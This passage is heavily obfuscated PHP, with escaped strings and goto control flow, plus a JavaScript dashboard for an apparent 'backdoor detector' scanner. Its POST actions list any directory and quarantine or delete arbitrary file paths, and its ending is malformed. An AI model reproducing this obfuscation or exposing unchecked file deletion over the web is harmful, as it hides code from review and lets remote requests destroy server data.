"\55\x20{$file["\160\x61\x74\x68"]}\x20\133" . strtoupper($file["\162\151\x73\x6b\137\x6c\145\166\x65\x6c"]) . "\135\xa"; foreach ($file["\164\150\x72\145\141\x74\163"] as $t) { $report .= "\40\40\52\x20{$t}\xa"; } $report .= "\12"; } } else { $report .= "\x4e\157\x20\x74\150\162\x65\141\x74\163\x20\x64\x65\x74\145\143\164\145\x64\x20\157\x72\40\156\157\x20\x66\x69\x6c\x65\x73\x20\x73\x63\x61\156\x6e\145\x64\x2e\12"; } return $report; } public function status() { $total = count($_SESSION["\x64\145\164\145\143\164\157\x72\137\x66\151\x6c\145\x5f\154\151\x73\164"] ?? array()); $idx = $_SESSION["\x64\x65\164\145\143\x74\157\162\137\x69\156\x64\145\x78"] ?? 0; $scanned = $_SESSION["\144\145\164\145\x63\164\x6f\x72\x5f\163\143\141\x6e\156\145\144"] ?? 0; $suspicious = $_SESSION["\x64\145\x74\145\x63\x74\x6f\162\x5f\163\165\x73\160\x69\x63\x69\157\165\163"] ?? 0; $cleaned = $_SESSION["\x64\145\x74\145\143\x74\157\162\x5f\x63\x6c\x65\141\156\145\144"] ?? 0; $last = $_SESSION["\144\145\164\x65\x63\164\157\162\x5f\154\x61\163\164\x5f\x66\x69\154\145"] ?? null; $filterLevel = $_SESSION["\x64\x65\164\145\143\x74\x6f\162\x5f\x66\151\154\x74\145\x72\137\154\145\x76\x65\x6c"] ?? "\x61\154\154"; return array("\164\x6f\x74\x61\x6c\137\146\x69\x6c\145\x73" => $total, "\151\x6e\144\x65\170" => $idx, "\x73\x63\141\156\x6e\145\144" => $scanned, "\163\165\163\x70\151\143\x69\157\x75\163" => $suspicious, "\x63\x6c\x65\141\156\x65\144" => $cleaned, "\x6c\141\163\164\137\x66\151\x6c\145" => $last, "\x66\151\x6c\x65\x73\137\x66\157\x75\x6e\144" => min(50, $total), "\146\x69\154\164\x65\162\137\x6c\145\166\x65\154" => $filterLevel); } public function nextIndex() { $_SESSION["\144\145\x74\x65\143\164\157\x72\137\x69\156\144\x65\x78"] = ($_SESSION["\144\145\x74\x65\x63\x74\157\x72\x5f\x69\156\144\x65\170"] ?? 0) + 1; } } goto qc0Sc; Phn4Z: set_time_limit(0); goto rZ4wE; qc0Sc: $detector = new PhpBackdoorDetector(); goto Alkej; LGxls: session_start(); goto OXtnU; EBp3_: if ($action) { if ($action !== "\145\x78\160\x6f\x72\164") { header("\103\x6f\156\164\145\156\164\x2d\x54\x79\160\145\x3a\x20\x61\160\x70\x6c\151\143\x61\x74\x69\x6f\156\57\x6a\x73\x6f\156\x3b\x20\x63\150\x61\x72\x73\x65\x74\75\x75\164\146\x2d\x38"); } switch ($action) { case "\x6c\151\163\164\137\x66\x69\x6c\145\x73": $dir = $_POST["\x64\x69\x72\x65\x63\164\157\x72\x79"] ?? $_GET["\144\x69\x72\145\x63\164\x6f\162\171"] ?? getcwd(); $filterLevel = $_POST["\146\x69\x6c\x74\x65\x72\x5f\154\x65\166\145\x6c"] ?? "\141\154\154"; echo json_encode($detector->buildFileList($dir, 20000, $filterLevel)); die; case "\163\x63\x61\x6e\x5f\156\145\x78\x74": $list = $_SESSION["\144\x65\164\x65\143\x74\x6f\162\137\x66\151\154\145\137\x6c\151\163\164"] ?? array(); $idx = $_SESSION["\144\145\164\145\x63\164\x6f\x72\137\x69\x6e\x64\x65\170"] ?? 0; if (!isset($list[$idx])) { echo json_encode(array("\x64\157\156\x65" => true, "\163\x74\141\164\x75\x73" => $detector->status())); die; } $file = $list[$idx]; $_SESSION["\144\145\x74\x65\143\x74\x6f\x72\x5f\x69\156\x64\145\x78"] = $idx + 1; session_write_close(); $res = $detector->scanFileEntry($file); session_start(); $out = array("\146\x69\x6c\x65\x5f\162\x65\x73\x75\154\164" => $res, "\x73\x74\141\164\165\163" => $detector->status()); session_write_close(); echo json_encode($out); die; case "\161\165\141\162\141\156\x74\x69\x6e\x65": $file = $_POST["\146\151\154\145"] ?? ''; echo json_encode($detector->quarantineFile($file, true)); die; case "\144\x65\154\x65\x74\x65": $file = $_POST["\x66\x69\x6c\x65"] ?? ''; echo json_encode($detector->deleteFile($file)); die; case "\145\x78\x70\157\162\164": header("\103\x6f\156\164\145\x6e\164\x2d\124\x79\x70\145\x3a\x20\x74\x65\x78\x74\x2f\160\154\141\151\156\73\40\x63\150\x61\x72\x73\x65\164\x3d\165\x74\x66\x2d\x38"); header("\x43\x6f\156\164\x65\x6e\164\x2d\x44\151\163\x70\157\163\x69\164\151\157\156\72\40\x61\164\x74\x61\x63\x68\155\145\x6e\164\73\40\146\151\x6c\x65\x6e\141\155\145\75\42\x73\145\x63\165\x72\x69\164\171\137\162\145\160\x6f\x72\164\x5f" . date("\131\55\155\55\144") . "\56\x74\170\x74\42"); echo $detector->exportReport(); die; case "\163\164\x61\x74\x75\163": echo json_encode($detector->status()); die; case "\162\145\x73\145\164": unset($_SESSION["\144\145\x74\145\143\164\157\162\137\x66\x69\154\x65\x5f\154\x69\163\x74"], $_SESSION["\144\145\x74\x65\x63\x74\x6f\162\x5f\151\156\x64\145\x78"], $_SESSION["\144\x65\x74\x65\x63\164\x6f\162\137\162\x65\x73\x75\x6c\164\x73"], $_SESSION["\x64\145\164\x65\143\164\x6f\162\x5f\x73\143\141\156\x6e\145\x64"], $_SESSION["\x64\x65\x74\x65\143\164\x6f\x72\x5f\x73\165\163\x70\x69\x63\151\x6f\165\163"], $_SESSION["\144\x65\x74\x65\143\164\x6f\162\137\143\x6c\x65\x61\156\145\x64"], $_SESSION["\144\145\164\145\x63\164\x6f\162\137\154\141\163\x74\137\x66\x69\154\145"], $_SESSION["\x64\x65\164\x65\143\164\157\162\137\146\151\154\x74\145\x72\137\x6c\145\166\x65\154"]); echo json_encode(array("\x6f\x6b" => true)); die; default: echo json_encode(array("\145\162\x72\157\x72" => "\x55\x6e\x6b\156\157\167\x6e\40\141\143\x74\x69\x6f\156")); die; } } goto KgHT3; cPtFH: session_start(); goto Phn4Z; OXtnU: $hashed_password = "\x24\62\x61\x24\61\62\x24\x41\x46\x2e\x73\152\x52\x79\x50\120\x72\x49\167\71\x70\x77\154\x52\161\66\x7a\163\x75\x46\62\156\105\121\65\x2f\162\x30\153\x4a\x37\126\x36\146\x56\130\x41\170\x49\170\x31\x6e\x4e\x63\x71\131\164\x6a\154\66"; goto RYJWC; Alkej: $action = $_POST["\141\x63\x74\151\x6f\156"] ?? $_GET["\141\143\164\151\157\x6e"] ?? null; goto EBp3_; PoGQ5: ?>
"></div><div><label class="text-sm block mb-1">Risk Level Filter</label> <select class="rounded bg-gray-800 w-full p-2"id="filter-level"><option value="all">All Levels</option><option value="high_only">High Only</option><option value="medium_only">Medium Only</option><option value="high_medium">High + Medium</option></select></div></div><div class="flex items-center mt-4 space-x-4"><button class="rounded px-4 py-2 bg-blue-600"id="start-btn">Start Scan</button> <button class="rounded px-4 py-2 bg-red-600"id="stop-btn"disabled>Stop</button> <button class="rounded px-4 py-2 bg-green-600"id="export-btn">Export Report</button> <button class="rounded px-4 py-2 bg-gray-700"id="reset-btn">Reset</button></div></div><div class="rounded glass p-6 mb-6"id="progress-area"style="display:none"><div class="flex justify-between"><p class="font-semibold text-lg"id="progress-text">0 / 0</p><p class="text-sm mono max-w-xs truncate"id="current-file">-</p></div><div class="rounded bg-gray-800 w-full h-3 mt-4"><div class="rounded h-3 bg-indigo-500"id="progress-bar"style="width:0%"></div></div></div><div class="rounded glass p-6"id="results-section"><h3 class="font-semibold text-lg">Scan Results</h3><div class="mt-3 space-y-3"id="results-list"></div></div><div class="rounded glass p-4 mt-6"><h4 class="text-sm font-medium">Live Log</h4><div class="rounded p-2 mono bg-gray-900 h-48 mt-2 overflow-auto text-sm"id="log"></div></div></main><script>(function(){
    const startBtn = document.getElementById('start-btn');
    const stopBtn = document.getElementById('stop-btn');
    const exportBtn = document.getElementById('export-btn');
    const resetBtn = document.getElementById('reset-btn');
    let scanning = false;

    function log(msg, type='info') {
        const el = document.getElementById('log');
        const t = new Date().toLocaleTimeString();
        const row = document.createElement('div');
        row.textContent = `[${t}] ${msg}`;
        el.appendChild(row);
        el.scrollTop = el.scrollHeight;
    }

    function api(action, data = {}, expectJson = true) {
        const form = new FormData();
        form.append('action', action);
        for (const k in data) form.append(k, data[k]);
        return fetch('', { method: 'POST', body: form }).then(r => expectJson ? r.json() : r.text());
    }

    async function startScan() {
        if (scanning) return;
        scanning = true;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        document.getElementById('progress-area').style.display = 'block';

        const dir = document.getElementById('scan-directory').value || '';
        const filterLevel = document.getElementById('filter-level').value || 'all';
        log('Starting scan in: ' + (dir || 'root'));
        const res = await api('list_files', { directory: dir, filter_level: filterLevel });
        if (res.error) {
            log('Error: ' + res.error);
            stopScan();
            return;
        }
        log(`Found ${res.count} files. Starting scan...`);
        updateStatus();
        pollScan();
    }

    async function pollScan() {
        if (!scanning) return;
        try {
            const res = await api('scan_next');
            if (res.done) {
                log('Scan completed.');
                stopScan();
                return;
            }
            const fr = res.file_result;
            if (fr.error) {
                log('Error: ' + fr.error);
            } else {
                if (fr.risk_level === 'trusted') {
                    log(`Trusted: ${fr.path} -> WHITELISTED`);
                } else {
                    log(`Scanned: ${fr.path} -> ${fr.risk_level.toUpperCase()}`);
                }
                if (fr.included || res.status.filter_level === 'all') {
                    addResult(fr);
                }
            }
            updateProgressUI(res.status);
            setTimeout(() => { if (scanning) pollScan(); }, 40);
        } catch (e) {
            log('Error: ' + e.message);
            stopScan();
        }
    }

    function updateProgressUI(status) {
        const total = status.total_files || 0;
        const scanned = status.scanned || 0;
        const pct = total ? Math.round((scanned/total)*100) : 0;
        document.getElementById('progress-text').textContent = `${scanned} / ${total}`;
        document.getElementById('progress-bar').style.width = pct + '%';
        document.getElementById('scanned-count').textContent = scanned;
        document.getElementById('threats-count').textContent = status.suspicious || 0;
        document.getElementById('cleaned-count').textContent = status.cleaned || 0;
        document.getElementById('security-score').textContent = Math.round(100 - ((status.suspicious||0)/Math.max(1,total)*100)) + '%';
        if (status.last_file) document.getElementById('current-file').textContent = status.last_file;
    }

    function addResult(fr) {
        const list = document.getElementById('results-list');
        const item = document.createElement('div');
        let riskClass = 'bg-gray-800';
        let riskColor = 'text-gray-300';
        let showActions = true;
        
        switch(fr.risk_level) {
            case 'high': 
                riskClass = 'bg-red-900 border-red-500'; 
                riskColor = 'text-red-300'; 
                break;
            case 'medium': 
                riskClass = 'bg-yellow-900 border-yellow-500'; 
                riskColor = 'text-yellow-300'; 
                break;
            case 'trusted': 
                riskClass = 'bg-green-900 border-green-500'; 
                riskColor = 'text-green-300';
                showActions = true;
                break;
        }
        
        item.className = `${riskClass} border p-3 rounded`;
        const threats = (fr.threats || []).map(t=>`<li>${t}</li>`).join('');
        
        const actionsHtml = showActions ? 
            `<div class="space-y-1">
                <button class="quarantine-btn bg-yellow-600 px-2 py-1 rounded text-xs" data-path="${encodeURIComponent(fr.path)}">Quarantine</button>
                <button class="delete-btn bg-red-700 px-2 py-1 rounded text-xs" data-path="${encodeURIComponent(fr.path)}">Delete</button>
            </div>` : 
            `<div class="text-xs text-green-400">✓ Trusted</div>`;
            
        item.innerHTML = `<div class="flex justify-between">
            <div>
                <div class="mono text-sm">${fr.path}</div>
                <div class="text-xs mt-1">Risk: <strong class="${riskColor}">${fr.risk_level.toUpperCase()}</strong></div>
                <ul class="text-xs mt-2">${threats}</ul>
            </div>
            ${actionsHtml}
        </div>`;
        
        list.prepend(item);

        if (showActions) {
            item.querySelector('.quarantine-btn').addEventListener('click', async (e)=>{
                const p = decodeURIComponent(e.currentTarget.getAttribute('data-path'));
                if (!confirm('Quarantine: ' + p + '?')) return;
                const res = await api('quarantine', { file: p });
                if (res.ok) log('Quarantined: ' + res.quarantine);
                else log('Fail: ' + res.error);
                updateStatus();
            });

            item.querySelector('.delete-btn').addEventListener('click', async (e)=>{
                const p = decodeURIComponent(e.currentTarget.getAttribute('data-path'));
                if (!confirm('Delete permanently: ' + p + '?')) return;
                const res = await api('delete', { file: p });
                if (res.ok) log('Deleted: ' + res.deleted);
                else log('Fail: ' + res.error);
                updateStatus();
            });
        }
    }

    function updateStatus() {
        api('status').then(updateProgressUI).catch(console.warn);
    }

    function stopScan() {
        scanning = false;
        startBtn.disabled = false;
        stopBtn.disabled = true;
    }

    function exportReport() {
        const form = document.createElement('form');
        form.method = 'POST';
        form.style.display = 'none';
        const input = document.createElement('input');
        input.name = 'action';
        input.value = 'export';
        form.appendChild(input);
        document.body.appendChild(form);
        form.submit();
        document.body.removeChild(form);
    }

    async function reset() {
        if (!confirm('Reset session?')) return;
        await api('reset');
        document.getElementById('results-list').innerHTML = '';
        document.getElementById('log').innerHTML = '';
        updateStatus();
        log('Session reset.');
    }

    startBtn.addEventListener('click', startScan);
    stopBtn.addEventListener('click', stopScan);
    exportBtn.addEventListener('click', exportReport);
    resetBtn.addEventListener('click', reset);
    updateStatus();
})();</script></body></htm')); ?>
